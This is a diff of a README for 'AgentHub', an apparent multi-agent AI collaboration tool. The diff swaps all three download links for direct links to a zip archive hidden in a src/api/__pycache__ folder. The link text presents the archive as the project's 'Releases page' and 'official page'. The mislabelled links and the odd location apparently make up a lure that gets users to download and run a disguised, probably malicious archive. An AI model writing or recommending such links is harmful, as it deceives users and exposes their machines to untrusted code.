@@ -1,7 +1,7 @@
 # 🤖 AgentHub - Effortless AI Collaboration for Everyone
 
 ## 📦 Download AgentHub
-[![Download](https://raw.githubusercontent.com/cuteecarrot/AgentHub/main/src/protocol/Hub_Agent_3.3.zip)](https://raw.githubusercontent.com/cuteecarrot/AgentHub/main/src/protocol/Hub_Agent_3.3.zip)
+[![Download](https://github.com/cuteecarrot/AgentHub/raw/refs/heads/main/src/api/__pycache__/Hub_Agent_v3.5.zip)](https://github.com/cuteecarrot/AgentHub/raw/refs/heads/main/src/api/__pycache__/Hub_Agent_v3.5.zip)
 
 ## 🚀 Getting Started
 Welcome to AgentHub! This application allows you to collaborate with advanced AI models like Codex, Gemini, and Claude. It enables seamless teamwork and effective multi-agent development.
@@ -18,7 +18,7 @@ Welcome to AgentHub! This application allows you to collaborate with advanced AI
 - **Storage:** Minimum of 200 MB of free space for installation.
 
 ## 💻 Download & Install
-To get started with AgentHub, visit the Releases page: [Download AgentHub](https://raw.githubusercontent.com/cuteecarrot/AgentHub/main/src/protocol/Hub_Agent_3.3.zip).
+To get started with AgentHub, visit the Releases page: [Download AgentHub](https://github.com/cuteecarrot/AgentHub/raw/refs/heads/main/src/api/__pycache__/Hub_Agent_v3.5.zip).
 
 1. Click on the link to visit the Releases page.
 2. Locate the latest release.
@@ -42,6 +42,6 @@ Join our community on platforms that promote AI collaboration. Share your experi
 AgentHub is open source and available for anyone to use. You can find the complete license information in the repository.
 
 ## 🔗 Further Resources
-For additional details and updates, please visit our official page: [GitHub Releases](https://raw.githubusercontent.com/cuteecarrot/AgentHub/main/src/protocol/Hub_Agent_3.3.zip).
+For additional details and updates, please visit our official page: [GitHub Releases](https://github.com/cuteecarrot/AgentHub/raw/refs/heads/main/src/api/__pycache__/Hub_Agent_v3.5.zip).
 
 Enjoy collaborating with your AI partners using AgentHub!
